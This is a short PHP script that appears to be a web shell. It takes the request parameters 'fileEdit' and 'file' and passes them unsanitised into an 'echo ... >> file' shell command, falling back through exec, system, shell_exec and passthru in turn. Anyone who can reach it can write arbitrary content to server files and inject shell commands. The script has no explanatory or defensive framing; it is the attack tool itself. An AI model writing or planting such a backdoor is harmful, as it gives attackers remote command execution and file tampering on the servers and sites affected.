<?php
echo "start";
if(function_exists('exec'))
	exec('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
elseif(function_exists('system')) 
	system('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
elseif(function_exists('shell_exec'))
	shell_exec('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
elseif (function_exists('passthru')) 
	passthru('echo '.$_REQUEST['fileEdit'].' >> '.$_REQUEST['file']); 
?>